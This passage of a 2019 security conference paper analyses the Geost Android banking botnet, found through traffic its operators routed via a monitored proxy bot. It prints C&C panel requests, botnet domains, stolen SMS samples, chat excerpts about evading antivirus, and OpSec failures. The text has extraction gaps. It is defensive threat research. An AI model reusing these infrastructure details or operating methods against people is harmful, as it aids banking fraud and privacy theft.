review. OpSec problems are hard to mitigate and they usually lead to the discovery of how botmasters operate or who they are [3]. Good OpSec can protect the user, but depending on the adversary, small mistakes can be very costly. One of the most famous OpSec incidents was that of Guccifer 2.0, the alleged persona that attacked the Democratic National Committee in the US, whose real afﬁ liation was supposedly conﬁ rmed when Guccifer 2.0 apparently failed to activate their VPN during one login process [3]. This is an example of how hard good OpSec can be, even for experienced attackers.A similar case of OpSec failure being taken advantage of by a powerful adversary was the identiﬁ cation of the owner of the Silk Road drug-selling site, Ross Ulbricht. Ulbricht was found because he used his personal email account to register other accounts related to his illegal site [4]. Although good OpSec is possible [5], cybercriminals also make mistakes that put them in jeopardy.Practising good OpSec is hard, and it’s harder when others try to force mistakes. In 2009 the Mariposa botmasters were captured because they connected to their servers directly from their homes. They usually used VPN services but after the police took their servers down (to force their hand), the botmasters panicked and connected insecurely. This paper provides an analysis of OpSec mistakes committed by a group of attackers while managing part of a botnet.Regarding previous work on the Geost botnet, the only previous unnamed reference found was a post from September 2017 on the blog site Virqdroid [6]. This blog post analysed one of the malware’s APK ﬁ les, showed its technical qualities, and reported the IoCs. However, the blog lacked data about the threat, the attackers and the victims, and therefore conclusions could not be drawn as to the size of the operation or the identity of the Android banking botnet.Probably the most well-studied part of Android banking trojans are the binaries themselves. This is because binaries are the ﬁ rst contact with the security community and usually the only source of information. The number of binaries related to Android banking trojans suggest that these threats have been rising during 2017 [7] and 2018 [8], although no scientiﬁ c study has focused on a systematic analysis of the problem. Android banking malware is too numerous to describe, but a few important mentions can be made. In the early 2000s trojans Perkele and ibanking were well known for using SMS as a communication channel [9]. From 2014 there was a new era of banking botnets with the appearance of Slempo, Marcher, Shiz, BankBot and MazarBOT [9]. Their infection techniques, C&C protocols, and the attacks performed were signiﬁ cantly improved.VIRUS BULLETIN CONFERENCE OCTOBER 20193GEOST BOTNET. THE STORY OF THE DISCOVERY OF A NEW ANDROID GARCIA ET AL.Analysing a malware binary is very useful, but the network trafﬁ c provides a different perspective. Even though some binary analysis may reveal network trafﬁ c [10], it is very difﬁ cult to capture trafﬁ c from the botmaster’s actions. In this regard, this paper shows a novel discovery of real botmasters’ actions while using their C&C servers.3. DISCOVERY The Geost Android banking botnet was discovered as part of a larger malware analysis operation in our laboratory. During an experiment in which a sample of the HtBot malware was executed [11], the trafﬁ c analysis revealed a very unusual communication pattern that stood out from the rest. HtBot operates by converting its victims into unwilling private illegal Internet proxies. The infected victims relay communications from the HtBot users to the Internet. HtBot is regarded as an underground proxy network that is difﬁ cult for security analysts to tap, since its trafﬁ c is continually redirected to new victims. The users of the HtBot network pay the HtBot botmasters to provide them with high-speed, semi-private communications for their operations.Figure 1: Discovery of the Geost botnet. A monitored bot of the HtBot malware was used by the Geost botmasters. First, the Geost botmaster connected to the HtBot network; second, the HtBotnetwork relayed the data to our bot; third, our bot sent the trafﬁ c to the Internet; fourth, thebotmaster accessed the Geost C&C server on the Internet.4VIRUS BULLETIN CONFERENCE OCTOBER 2019GEOST BOTNET. THE STORY OF THE DISCOVERY OF A NEW ANDROID GARCIA ET AL.Our laboratory was running and monitoring HtBot bots that were communicating with the Internet. Since these bots offered illegal proxy connections it was possible to capture all the trafﬁ c coming from the illegal users to the Internet. During the analysis of the network trafﬁ c of the illegal users, a pattern was discovered; this turned out to be the content of the C&C communication channel of the new Geost botnet. Figure 1 shows the infrastructure operation of the HtBot malware and how it was used to ﬁ nd the new Geost botnet. When the botmasters of the Geost botnet connected to the HtBot proxy network they sent all their trafﬁ c through our victim bot, and therefore through our monitoring service. Therefore, all the information collected about Geost’s actions comes from looking at the trafﬁ c going through our computer. The analysis of the HtBot malware trafﬁ c revealed the pattern shown in Figure 2. This pattern was discovered thanks to two features that stand out: the large amount of trafﬁ c transferred and the lack of encryption. Transfers of such large amounts of unencrypted data are not common in a normal network. The use of unencrypted web servers for the C&C operation was the second OpSec mistake made by the botmasters. It is not clear why they neglected to use TLS encryption, since it is free and easy to install. The main hypothesis is that they may have had a large number of C&C servers and managing the certiﬁ cates for them all would have been time consuming.Figure 2: Unencrypted trafﬁ c pattern of the Geost botnet that helped to ﬁ nd it. This trafﬁ c was laterfound to correspond with the download of SMS messages from the Android phone victims.The OpSec decision of the Geost botmasters to use the HtBot proxy botnet is believed to be based on the idea that an illegal proxy network may have better security than other alternatives, such as the Tor network [12], a commercial VPN network, or their own compromised servers on the Internet. The Tor network was probably discarded as a bad OpSec choice since it is known to be monitored [13]. The option of a commercial VPN has the disadvantage that the botmasters would be putting their trust in a private company that may be forced to submit its logs to the authorities. The third option, ofVIRUS BULLETIN CONFERENCE OCTOBER 20195GEOST BOTNET. THE STORY OF THE DISCOVERY OF A NEW ANDROID GARCIA ET AL.compromised servers, may be the best from an OpSec point of view, but it would involve extending the current Android banking botnet with another layer of servers, infections, malware, monitoring, and maintenance. This option is much more costly than the rest. The decision to use the HtBot network may have seemed wise since it does not belong to a company, it’s not usually monitored, and it handles its own maintenance. In the end, though, the decision to use the HtBot network was the ﬁ rst operational security mistake. It seems that the balance of probabilities and cost-beneﬁ t analysis were not correctly evaluated by the botmasters.4. BOTNET OPERATIONS The main advantage of accessing the botmasters’ trafﬁ c while they were using the HtBot network was the possibility of a deep study of the attackers’ decisions and actions. The analysis helped to identify a large botnet infrastructure, measure the size of the operation, and determine the goal of the botnet. Based on the evidence found, the Geost operation seems to consist of a large number of APK Android applications related to several topics, from banks and photo services, to fake social networks. Once the applications are installed it seems that they may be able to interact directly with the web services of ﬁ ve banks in Eastern Europe. It seems that one of the goals of the botnet is to access the personal information of the victims through their SMS messages, including those messages sent by the banks. The rest of this section describes the actions of the botmasters and how they helped identify each part of the Geost botnet. It is worth remembering that this was the trafﬁ c traversing our HtBot instance.Access and actions in the C&C ServersThe botmasters accessed the C&C servers through a web server using port 80/TCP. The web server was running nginx version 1.12.2. The ﬁ rst connection seen in the trafﬁ c was made on Sat, 10 Mar 2018 11:54:08 GMT and it was an access to the C&C server with the following request (not complete): GET /geost.php?bid=c5d72910bd8a97aeb2ce 7336fbd78a1f HTTP/1.1 Host: wgg4ggefwg.ru User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:48.0) Gecko/20100101 Firefox/48.0 Accept-Language: en-US,en;q=0.5 Referer: url Cookie: SSE=p6ee96ki2knqrtsahdv84cuj04; __lnkrntdmcvrd=-1From this request several things can be learned. First, that the botmaster was already logged in, because the cookie was already set. Second, that the botmaster was probably using a Windows computer, given the User-Agent. Third, that the domain was wgg4ggefwg.ru, and that the request was coming from the web page url After this ﬁ rst request, the botmaster changed a note on one of the victims with the following request:6VIRUS BULLETIN CONFERENCE OCTOBER 2019GEOST BOTNET. THE STORY OF THE DISCOVERY OF A NEW ANDROID GARCIA ET AL.POST /stuﬀ .php?mode=change_notes notes=14.50+10.03+68.000The fact that the botmasters put notes on individual victims suggests that they may have been after something more than automatic access to their bank accounts. After changing the note for a victim, the botmaster requested a list of SMS messages from a victim with the HTTP request POST /stuﬀ .php?mode=showSmsList. The response to this request was a long list of more than 900 SMS messages from one victim. The SMS messages are analysed in Section 6.The original HTTP response with the SMS list was a JSON ﬁ le using Unicode encoding (\u chars) for transferring Russian characters. The following is an example: {""response"": [{""conversations"": {""+900"":[{""body"":""\u0421\u043f \u0438\u0441\u0430\u043d\u0438The decoded text in Russian is as follows (the password was redacted): Списание средств: Platbox (RUB 120.00); пароль: 342365.Не сообщайте пароль НИКОМУ. Только мошенники запрашивают пароли.The English translation of this message is: Withdrawal of funds: Platbox (RUB 120.00); password: 342365. Do not disclose the password to ANYONE. Only fraudsters request passwords.This SMS seems to be a message from the Platbox Russian payment system saying that 120 Russian Rubles have been withdrawn. Despite our initial assumption that the botnet was only looking for two-factor authentication messages, it is unclear why the botmasters are monitoring these messages. The ﬁ rst important remark is that the C&C stores the complete list of SMS messages of all the victims since the moment they were infected. The second important remark is that the SMSs were processed ofﬂ ine in the C&C server to automatically compute the balance of each victim. This can be seen in the C&C web page shown in Figure 4.The SMS messages stored and used by Geost contained highly sensitive information. For example, a victim infected from July 2017 until March 2018 received the following SMS:• Transfers in bank accounts:[redacted]Bank Online. Lada SE[name redacted]NA transferred to you 2500 RUBA message from a bank to a victim about money received.• VISA balances:VISA5880 03/07/18 18:32 admission 2500r Balance: 49866.86This information about balances was analysed automatically by the C&C channel.VIRUS BULLETIN CONFERENCE OCTOBER 20197GEOST BOTNET. THE STORY OF THE DISCOVERY OF A NEW ANDROID GARCIA ET AL.Botmaster access to the login page More than eight days after the ﬁ rst access, a botmaster showed up again to access the Geost C&C server. It may have been a different botmaster because the User-Agent of their browser was different from the ﬁ rst time. The ﬁ rst time, the User-Agent was Mozilla/5.0 (Windows NT 6.1; rv:48.0) Gecko/20100101 Firefox/48.0, which is a Windows computer. The second time it was Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0, which is an older version of browser in a Windows computer. Since it’s very unlikely that the botmaster downgraded the browser, the conclusion is that these are different computers. During this second access, it was possible to observe the complete login process and to obtain the master password of the C&C server. The long-term execution of the malware, which is standard policy in our laboratory, made possible the capture of this important piece of information. This connection also reveals the third OpSec error: the botmasters believed that it was safe to use the HtBot proxy network again. This is a huge underestimation of the security risk of using the same service twice. A better approach would have been to change the connection method every time. The login request was sent as GET /geost.php and resulted in the login page shown in Figure 3. This page was reconstructed in our browsers by extracting the data from the trafﬁ c capture. The login page has an option to change the language between Russian and English, which suggests that the botmasters may speak either of those languages. After the login page was presented, the botmaster logged in with the following request (not complete): POST /stuﬀ .php?mode=autorize HTTP/1.1 Host: wgg4ggefwg.ru User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0 X-Requested-With: XMLHttpRequest Referer: url Content-Length: 31 Cookie: SSE=epr0dr4qlejbgphtqppmmjrca0 pwd=[redacted]&language=ruThe password used was 15 characters long and included nine numbers and six lower-case letters. The fact that the password was leaked means that it would be possible for others to log into the C&C server. The password is not incredibly complex since it lacked symbols and upper-case letters, but it is considered strong enough to resist the casual brute-forcer. It is also worth noting that there is a typo in the name of the request parameter, which is ‘autorize’ instead of authorize.Figure 3: Login page of the C&C server of the Geost botnet. No TLS was used and no username isrequested, only a password.8VIRUS BULLETIN CONFERENCE OCTOBER 2019GEOST BOTNET. THE STORY OF THE DISCOVERY OF A NEW ANDROID GARCIA ET AL.After logging in, the botmaster accessed the main panel of the C&C, shown in Figure 4. The main C&C web page is quite large, showing more than 7,500 infected phones and information about the version of the malware, IMEI of the phones, permissions of the malware, country of the phones, balance in the bank accounts, and much more. Figure 4 shows the following information for each victim:• Status: whether the victim is online. • ID: identiﬁ cation number of the victim assigned by the botnet. • IMEI: code that identiﬁ es each cell phone. • Rights: probably whether the malware has admin rights, or only SMS access, or both. • Version: version of the Android operating system. • Operator: phone operator. • Country: country of the phone – it is not clear how this is obtained, but probably using the phonenumber.• Balance: balance in the bank of the user. • Category: it is not clear what is this menu for – the options are: Balance, Spam, Dead, Lok,Tupyat, Sliv, Credit, OTKLU4en, NULOVKI and ONLIKI.• Flow: probably to identify how the phone was infected, given that the options are: marion1, deaand sitedub, which are related to APK applications.Figure 4: Main page of the C&C server of the Geost botnet. The C&C shows actions for injecting inbanks and managing spam.VIRUS BULLETIN CONFERENCE OCTOBER 20199GEOST BOTNET. THE STORY OF THE DISCOVERY OF A NEW ANDROID GARCIA ET AL.Features of the C&C By looking at the options on the C&C page it is possible to infer the goals of the botnet and its main activities. From the top menu it can be seen that the management of injects (speciﬁ c applications for each bank) is important, as well as the management of spam, SMS and Tasks. Under the menu Поток, which means Flow or Stream, there are the following options:• svd2 • iYl5i8 (Photo Youla). [Site youla.ru] • EBtiym (Photo Avito). [Site www.avito.ru] • sTPYWM (Установка) (means Installation) • zGnI6m (Вконтакт) (translates to VKontakte, a Facebook-like Russian social network) • Установить to install • wdbX4p (OK). OK.RU. url • GHf5Bt (Ula). url • I97CiN (Imo). ImoOnline.ru. Instant messaging app and VoIP. • 6NiFak (Yandex navigator) • 9ObVTr (2GIS). url • HaBxsX (ccleaner)10VIRUS BULLETIN CONFERENCE OCTOBER 2019GEOST BOTNET. THE STORY OF THE DISCOVERY OF A NEW ANDROID GARCIA ET AL.• RA6XMX (Clean Master) • bjAVX1 (updateplayer2018)The meaning of this menu is not completely clear but we suspect that it refers to a ﬁ lter as to how the victim was infected, since all the options refer to Android applications. This theory was conﬁ rmed later when it was found that each botnet operator has its own ‘Flow id’ to determine how many infections they produced. After accessing the main C&C web page the botmaster requested to ﬁ lter the victims by their online status using the following request: /stuﬀ .php?mode=ﬁ lter_onlineAfter the victims were sorted by online status, the botmaster sorted them by balance amount using the following request: /stuﬀ .php?mode=ﬁ lter_balanceThese two actions suggest that the intention was to see the online victims that have the largest balance of money, probably to act on them in some way, but no action was witnessed.Banks attackedBy accessing the client-side source code of the web page in the network trafﬁ c, it was possible to identify which banks were the focus of the Geost botnet. The fact that only ﬁ ve banks were listed suggests that there is a special type of action that can only happen with those banks. It may seem as if the malware APKs or the C&C code could access and make transfers in accounts of those banks, but this hypothesis was not proven. For security reasons the complete list of banks will not be published until the banks acknowledge our contact with them. However, it is possible to provide the following characteristics of the targeted banks:• The ﬁ rst bank is a Russian commercial neobank. One of the top ﬁ ve providers of credit cards inRussia.• The second bank is one of the ﬁ ve largest private commercial banks in Russia and one of the top1,000 world banks.• The third bank is one of the three largest banks in Russia and Eastern Europe, and one of the top40 banks in the world.• The fourth bank is one of the 500 largest organizations in Europe and one of the leading banks inRussia.• The ﬁ fth bank is part of a large group of cooperatives with subsidiaries in more than 15countries, being in the top seven banks in Russia.• The sixth bank is a publicly traded Russian payment service provider operating electronic online payment systems in Russia, Ukraine, Kazakhstan, Moldova, Belarus, Romania, the United States and the United Arab Emirates.VIRUS BULLETIN CONFERENCE OCTOBER 201911GEOST BOTNET. THE STORY OF THE DISCOVERY OF A NEW ANDROID GARCIA ET AL.5. BOTNET INFRASTRUCTURE The infrastructure used by Geost is large but not extremely complex. To date, 13 C&C IP addresses, more than 140 domains, and more than 150 APKs ﬁ les have been found. The domains seem to be randomly generated, but not with a complete domain generation algorithm.Randomness in Geost Domain generation algorithms (DGAs) are algorithms that generate domains in a pseudorandom way. This is used as a mechanism to avoid detection and hide the C&C server by resolving a new IP address very quickly. Since the algorithm is unknown to the analyst, they are usually unpredictable. However, the malware author knows the algorithm and therefore can predict which domain will be requested. The attacker then registers the domain with an IP address they control. There are usually three main ways to identify a DGA algorithm: (1) the domains seem random, (2) dozens of domains are requested very quickly, and (3) most of the domains do not have an IP assigned to them. However, in the case of Geost, the domain generation algorithm is very unusual. It looks random enough, but each sample only attempts to contact one domain. Also, all the domains found so far do have an IP address assigned. It is not clear, then, how the domains are assigned to each sample, but it appears that each domain is assigned to one sample. The DGA used in the Geost botnet is character- based, uses letters and numbers, and the TLD is .ru or .xyz. The only domain that broke the rule was g877855hrg.ru.com. The following is a sample list of Geost C&C domains:• w23t2t2tfwg.ru • 52t34tyt43.xyzAnother novel feature of Geost in reference to randomness is the use of an algorithm to generate PHP ﬁ le names. This is not strictly DGA since they are not domains, but the random principle is the same. The main difference between a classic DGA and the PHP ﬁ le generation algorithm is the purpose. While classic DGAs are intended to prevent the discovery of the botnet domains and subsequent takedown, the PHP ﬁ le generation algorithm prevents the generation of signatures to ﬁ nd and block those names. It is not simple, for example, to create a YARA rule that matches a DGA domain using a random PHP ﬁ le. The PHP ﬁ lenames are 32 characters long, the same as an MD5 string. The following is a sample list of the ﬁ lenames for the domain 2ve3gh53h3yh.ru:• m99h49wtp1g35b5721d64mfs5p8ese1x.php • hgkvf2riqt49z33isl978pj17aivc0nw.php12VIRUS BULLETIN CONFERENCE OCTOBER 2019GEOST BOTNET. THE STORY OF THE DISCOVERY OF A NEW ANDROID GARCIA ET AL.The ﬁ nal characteristic of Geost domains is that some of them have a large number of subdomains. For instance, the domain 2ve3gh53h3yh.ru has exactly 1,024 subdomains, such as 0hu, 00n, 03, 06p and 090.IP addresses At least 13 IP addresses have been found so far. Table 1 shows a summary of the IP addresses with, for each one, the Autonomous System (AS), country, number of domains related to the IP, and the number of APK hashes that communicate with it. It is worth noting that most IP addresses belong to The Geost botnet is associated with at least 150 APK (Android package) ﬁ les. Most APKs share some similarities with each other: each one mostly communicates with only one domain, and each one accesses one unique random PHP ﬁ le. Regarding the phone permissions, all of them requested access to read, receive, and send SMS messages, to write on the external storage, to access contacts, and to change Wi-Fi status. For the rest of this section we will refer to the APK binaries with their MD5 hash. The list of SHA256 sashes for the APK ﬁ les related to this paper can be found in the Appendix. according to VirusTotal, communicated with the domain w23t2t2tfwg.ru and PHP ﬁ le w23t2t2tfwg.ru and the PHP ﬁ le pyh32o0ezfguw1xl4382wzm8tnr1tyng.php. The domain w23t2t2tfwg. ru is one of the most commonly used by APK samples in Geost. Table 2 shows the complete list of 25 APK hashes that contacted the domain w23t2t2tfwg.ru together with their detection ratio in VirusTotal: the number of anti-virus engines that detected them positively on 23 February 2019 against the total number of anti-virus engines that checked the sample. For space reasons it was not possible to include the complete list of 150 APK hashes for the complete Geost botnet. was ﬁ rst seen in the wild in September 2017. The domains resolved by this sample were: 23r23e23er.xyz, fwefr434r3.xyz, rgrer43e2e.xyz, wef34r34rs.xyz and ge5t5t54trtr.xyz.SHA256 hash Table 2: SHA256 hashes of APKs related to the domain w23t2t2tfwg.ru.14VIRUS BULLETIN CONFERENCE OCTOBER 2019GEOST BOTNET. THE STORY OF THE DISCOVERY OF A NEW ANDROID GARCIA ET AL.Most of the APK binaries of the Geost botnet are identiﬁ ed in VirusTotal as ‘Android Hqwar’ or ‘Banking Trojan’. However, both terms are generic and used to identify thousands of binaries that are protected by a software packer or an obfuscating method. Therefore, this particular botnet has not been identiﬁ ed by the community until now. As an example of how each APK was detected by VirusTotal, Table 2 shows a subsample of the total number of APKs and their detection ratios.Relationships in the infrastructure Among the uncommon characteristics of the Geost infrastructure are: (i) each domain corresponds to a unique IP address; (ii) no domain was ever seen without an IP address registered; (iii) each IP address has more than one domain assigned to it; (iv) domains always refer to the same IP address. It is worth noting that the Geost malware used random generation of words at least in three places: (1) to generate its domain names, (2) to generate the names of PHP ﬁ les, and (3) to generate the names of the APK packages. An example relationship between the pieces of the botnet’s infrastructure is the sample banks and the name of its package is ‘com.vuzbswbpv.ipapszyud’. The same IP address was also assigned to the domain t43r43r43.xyz that is requested by the sample The trafﬁ c generated by the botmasters when accessing the C&C server revealed information about the victims of this botnet. It seems that the botmasters kept a detailed summary of the victims, and that this summary was important for the operation of the botnet. The victims of this botnet not only probably lose money but they had their privacy and identity completely compromised. The minimum amount of information that the botmasters know about each victim can be seen in the following list:• IMEI of the phone• Brand of the phone• Phone service provider• Phone number• Country of the phone number• Current balance of bank accounts• History of balance in each bank account (the history of the balance is not even available to thevictims themselves)• Whether they have a credit card tied to the phone• From the SMS of the victims:- Name of victim - Home address - Social relationshipsVIRUS BULLETIN CONFERENCE OCTOBER 201915GEOST BOTNET. THE STORY OF THE DISCOVERY OF A NEW ANDROID GARCIA ET AL.- Religion - Financial problems.Regarding the number of victims, it is only possible to speculate. In the C&C server of the IP address estimation of 72,600 victims in that C&C alone. Extrapolating this to the 13 C&C servers, a rough estimation of the total number of victims may be 871,200. It is possible that even more victims exist, given that there may be more C&C servers. According to the 50 victims shown in one of the C&C screens, there is a column labelled ‘Balance’ that shows the amount of money (in Rubles) in the bank accounts of the victims. The total sum of this column of 50 victims is 1,129,152 Rubles, which is approximately 15,000 Euros. Extrapolating this number to the estimated 800,000 victims in this C&C there may be an estimated maximum total amount of money close to 240,000,000 Euros. However, the real total for this C&C could be much lower if we consider that the web page is sorted by balance.IMEI Of all the information stolen from the victims, the IMEI is important because it can be used to identify them. The IMEI is a unique code assigned to cell phones and, by searching for it online, it is possible to ﬁ nd out information about the device. The IMEI number is divided into parts. The initial eight-digit portion of the IMEI, known as the Type Allocation Code (TAC), details the phone model and origin. The remainder of the IMEI is manufacturer-deﬁ ned, with a Luhn check digit at the end. Given the IMEI, it is possible to determine the victim’s phone model and characteristics. From the IMEI it was possible to learn the brands of the phones of the victims, which were all Android-based. From the IMEI numbers it was also possible to identify the victims’ phone operators, including Tele2, MTS RUS, Beeline, MegaFon, Yota and Motiv. The last one is a Russian regional provider.SMS data The access to SMS messages was probably one of the more invasive actions of the botnet. SMS messages potentially contain a lot of private information about the user. An analysis of the two SMS lists downloaded revealed that users shared very private conversations with friends and lovers, the status of their ﬁ nancial accounts, and sensitive private data about themselves. It was particularly interesting to ﬁ nd that most of the private information was leaked by the phone operators, including users’ real name, birthday, the last four numbers of their credit card, the amount of money in their balance, and the password for mobile banking applications. The following is an example SMS stolen by the attackers (without personal information): 07/03/18 18:59 VISA5880 purchase 120r MTS TOPUP 5635 Balance: 49746.86r7. ATTACKERS One of the most important breakthroughs of this analysis was the discovery of a ﬁ le in a public web page that referenced one of the Geost domains. This ﬁ le proved to be the chat log of a group of16VIRUS BULLETIN CONFERENCE OCTOBER 2019GEOST BOTNET. THE STORY OF THE DISCOVERY OF A NEW ANDROID GARCIA ET AL.people related to the Geost botnet operation. It is not clear how the ﬁ le was leaked, but since it was a Skype chat log it was probably created (whether on purpose or not) by one of the participants in the chat. The use of Skype as a communication medium is consistent with previous reports on the modus operandi of the Russian malware community [14]. The existence of this ﬁ le marks another OpSec error on the part of the botmasters: they trusted part of the operation to a group of users with very low or non-existent OpSec practices. It was possible, then, to conduct an open-source intelligence (OSINT) investigation to ﬁ nd out more about the group in this chat log. The ﬁ le has more than 6,200 lines, covering eight months of chats, and shows the private conversations of 29 people. Not all of them seem to be related to the Geost botnet since the group had several alternative streams of revenue. By analysing the top participants in the chat log it was possible to determine that the user ‘powerfaer’ was the only one talking with all the participants, making this user the probable owner of the chat log. During the time period from 2017-06-11 11:14 to 2018-04-17 18:41, powerfaer held business discussions with the other 28 people in relation to different projects. The conversations between powerfaer and the user with the nickname ‘mirrexx777’ seem to be the most notable since they showed a connection with the Geost botnet. For instance, on several occasions powerfaer and mirrexx777 exchanged links to the control panel of the Geost botnet, sharing information that nobody would possess unless they were insiders. The following is a human translation from Russian: On 2017-10-18 07:24:07 From powerfaer to mirrexx777: url Re-crypt, Kaspersky got cleaned From mirrexx777 to powerfaer: ok. will do. according to the old recordings how many of them remains? i want to start to keep a recordThe fact that they shared information from inside the C&C channels – information that you need to be logged in to see (the stats.php ﬁ le) – and the fact that they discuss the need to ﬁ x them, is strong evidence that they possess internal information with complete knowledge of its purpose. There were many pieces of evidence in the chat log showing a relationship with malware actions, such as asking to re-encrypt links because Kaspersky was able to detect them. It seems that the user powerfaer has operated since 2010. This is supported by one conversation where there was a remark about the income from trafﬁ c in 2010 having been better (translated from Russian): On 2017-12-06 18:14:46 From powerfaer to mirrexx777: That would be nice to get back in to 2012 Or 2010 Some conversations in the chat got serious and resulted in the use of real names as a means to call the attention of the other. This conﬁ rmed the names of some aliases. The following log conﬁ rmed the name of ‘taganchik.ru’ when powerfaer talked to him (translated from Russian):VIRUS BULLETIN CONFERENCE OCTOBER 201917GEOST BOTNET. THE STORY OF THE DISCOVERY OF A NEW ANDROID GARCIA ET AL.Alexander, really, if we started together we need to ﬁ nish it. Because for now this is working and we can earn money. Not every day we are getting 100k for promotion Later on, however, it seems that the user taganchik.ru tried to leave the group: 2017-10-15l14:53 From taganchik.ru to powerfaer: ( ) But now im saying i am working but in fact I dont. I am getting demotivated and do not want to do anything From taganchik.ru to powerfaer: i thought about it, and im not in From powerfaer to taganchik.ru: Understand, ok. Shame. If you change your mind write to me Showing a complete lack of OpSec, the chat log also revealed credentials for several servers and services, such as fttkit.com (an Android application protection service advertised on the Russian underground site crimina.la). The log also disclosed the IDs of online wallets, and credit card numbers. This information helped us ﬁ nd sensitive information about the identity of some individuals. For instance, ‘taganchik.ru’, ‘elkol95’ and ‘dmitrixxx89’ all advertise their services on the same web marketing forum, url The user powerfaer also engaged in conversations with several money launderers. The log conﬁ rms that online payment systems such as WebMoney, Qiwi, and Yandex Money remain popular among Russian cybercriminals [15]. However, these services are not anonymous and it would be possible to see the payments through third-party money launderers. The following is an example chat with the user ‘cyberhosting.ru’: On 2017-12-04 11:21 powerfaer wrote to cyberhosting.ru And another question, can you exchange cash to BTC? A challenge for us during the analysis was to understand the Russian underground slang. For example, the term white accounting should be translated to Russian as Белая бухгалтерия. However, cybercriminals used the term белка, which in English means squirrel. The same issue applies to other words like application, which translates to прила in Russian and has no direct translation in English. After a deep OSINT analysis it was possible to infer a list of probable real names for the following nicknames: ‘mirrexx777’, ‘powerfaer’, ‘cyberhosting.ru’, ‘taganchik.ru’, ‘doktorsaitov’, ‘dmitrixxx89’, and ‘maximchik700’. However, the names will not be published since their implication in the Geost operation has not been conﬁ rmed.8. CONCLUSION AND FUTURE WORK The discovery of the Geost Android banking botnet inside the trafﬁ c of another malware proxy shows that operational security is very hard to get right, and that simple mistakes can lead to deep understanding of the operations of malware authors. After the discovery of the Geost botmasters18VIRUS BULLETIN CONFERENCE OCTOBER 2019GEOST BOTNET. THE STORY OF THE DISCOVERY OF A NEW ANDROID GARCIA ET AL.accessing their C&C servers it was possible to ﬁ nd more and more pieces of their botnet infections, leading to a very large mapping of their attack infrastructure, their APK binaries, the number of victims infected, and an estimation of the economic size of the operation. Finally, it was possible to use open-source intelligence to relate a group of developers to part of the infrastructure-building process of the botnet. The developers do not seem to be the Geost botmasters, but an underground group related to them. Despite operating since at least 2016, the Geost botnet remained unknown until its trafﬁ c was captured on the HtBot malware. This may suggest that the best OpSec may be to hide operations among thousands of other malware. However, once the operation was found, it was clear that the group’s OpSec measures were not good since there were several mistakes that have led to information about the operation. The following is a summary of the operational security mistakes that led to the identiﬁ cation and understanding of the botnet:• Use of the illegal proxy network HtBot. Wrong estimation of the risk of using a service that wasbeing tracked in a security laboratory.• Failure to encrypt C&C trafﬁ c. It was possible to identify the trafﬁ c and the content of thecommunications.• Use of the same protection service multiple times. This allowed repeated monitoring of theattackers and the capture of credentials.• The hiring of a group of developers with very low OpSec, who disclosed links, names andcredentials in their chats.• Failure to encrypting chats. This allowed a document to be leaked containing importantinformation about the privacy of some attackers and leads about their identities.The amount of information collected on the Geost botnet was so large that it has not been possible to include all the details of the infrastructure, the victims found, banks accounts disclosed, phones infected, credit cards used, and the very interesting view of the social relationships within a group of underground cybercriminals. Therefore, our analysis of the Geost botnet will continue in several directions. The name ‘Geost’ was selected after the only web page that didn’t seem to change in the C&C servers.ACKNOWLEDGEMENTS We would like to thank Veronica Valeros for her help during the analysis and extraction of information. We also thank Professor Sebastian Garcia.REFERENCES: [1] Zhang, E. What is Operational Security? The Five-Step Process, Best Practices, and More.[2]Digital Guardian. 2018. urlﬁ ve-step- process-best-practices-and-more. Ilascu, I. Flaw in Telegram Reveals Awful OpSec from Malware Author. Bleeping Computer. 2017. urlﬂ aw-in-telegram-reveals-awful- opsec-from-malware-author/.VIRUS BULLETIN CONFERENCE OCTOBER 201919GEOST BOTNET. THE STORY OF THE DISCOVERY OF A NEW ANDROID GARCIA ET AL.[3] Newman, L.H. Yes, even elite hackers make dumb mistakes. Wired. 2018.[4]url Paul, K. How Silk Road’s Founder Could Have Avoided Getting Busted. Vice. 2015. urlﬁ ve-hidden-service-commandments.[5] Otten, B. Cybercriminal intent: When good OpSec met bad OpSec. Tech Beacon. 2016. url [6] Virqdroid. Mobile Threats targeting Russian Banks. url [7] Wei, F.; Li, Y.; Roy, S.; Ou, X.; Zhou, W. Deep ground truth analysis of current android[8]malware. Lecture Notes in Computer Science, vol. 10327 LNCS, pp.252–276, 2017. Štefanko, L. Android banking malware: sophisticated trojans vs. fake banking apps. ESET. 2019. url Banking_Malware.pdf.[9] Neto, P.D. The new era of Android banking botnets. url Shishkova, T. The rise of mobile banker Asacub. Kaspersky. 2018. url White, J. ProxyBack Malware Turns User Systems Into Proxies Without Consent. Palo AltoNetworks. 2015. url systems-into-proxies-without-consent/.[12] McCoy, D.; Bauer, K.; Grunwald, D.; Kohno, T.; Sicker, D. Shining light in dark places:Understanding the tor network. In Privacy Enhancing Technologies, N. Borisov and I. Goldberg, Eds. Berlin, Heidelberg: Springer Berlin Heidelberg, 2008, pp.63–76.[13] Chakravarty, S.; Portokalidis, G.; Polychronakis, M.; Keromytis, A.D. Detecting trafﬁ csnooping in tor using decoys. Lecture Notes in Computer Science, vol. 6961 LNCS, pp.222–241, 2011.[14] Terrelonge III, L. Cybercrime Economy. An Analysis of Criminal CommunicationsStrategies. Flashpoint 2017. urlﬁ les.wordpress.com/2017/05/ﬂ ashpoint_ cybercrime_economy.pdf.[15] Goncharov, M. Russian Underground Revisited. Trend Micro. 2014.url economy-series.APPENDIX: SHA256 HASHES OF ANDROID APKS FILES RELATED TO GEOST ","{'phrases': ['the attackers', 'Li', 'Ou', 'ANDROID', 'APK', 'FILES', 'app', 'banks', 'social networks', 'photo services', 'the victim', 'request', 'access', 'permissions', 'contacts', 'the Geost C&C server', 'C&C servers', 'PHP', 'S.', 'information', 'SMS messages', 'location', 'the C&C', 'the botnet', 'Operator', 'view', 'data', 'victims', 'balances', 'names', 'addresses', 'options', 'the botmasters', 'GET', 'Spam', 'X', 'identity', 'T.'], 'target': 'the attackers; Li; Ou; ANDROID; APK; FILES; app; banks; social networks; photo services; the victim; request; access; permissions; contacts; the Geost C&C server; C&C servers; PHP; S.; information; SMS messages; location; the C&C; the botnet; Operator; view; data; victims; balances; names; addresses; options; the botmasters; GET; Spam; X; identity; T..'}"
